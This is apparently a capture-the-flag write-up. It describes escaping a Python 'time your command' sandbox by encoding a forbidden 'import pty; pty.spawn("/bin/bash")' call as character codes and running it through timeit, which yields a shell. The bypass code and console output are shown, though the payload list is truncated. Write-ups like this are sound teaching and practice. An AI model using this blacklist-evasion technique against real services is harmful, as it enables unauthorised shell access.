This one is a cool blacklist bypass. It's pretty simple. You are presented a
text interface asking you to enter a python command.

```console
Type a command to time it!
```

Trying some simple functions seem to work fine, but....

```console
Type a command to time it!
print(1)
Runtime: 1.09672546387e-05

Type a command to time it!
import os
Hey, no hacking!
```

...there seems to be a blacklist of characters that get screened before the
command is run. We must obfuscate it somehow. By digging around, we can see
exactly what is in the blacklist and what isn't in the blacklist. Most
peculiarly, `timeit` is **NOT** in the blacklist.

```

We can do something like the following in order to trick the program into
executing blacklisted commands:

```python
# We want to execute the following python
want_exec = 'import pty;pty.spawn("/bin/bash")'
# So we obfuscate it a bit
obfuscated = [ord(x) for x in want_exec]
# and we can just reverse it using a join-map
assert want_exec == ''.join(map(chr, obfuscated))

# Payload:
timeit(''.join(map(chr, [105, ...])))
```

By pasting the payload into the program, we get a shell:

```console
Type a command to time it!
timeit(''.join(map(chr, [105, ...])))
bash: /root/.bashrc: Permission denied

```
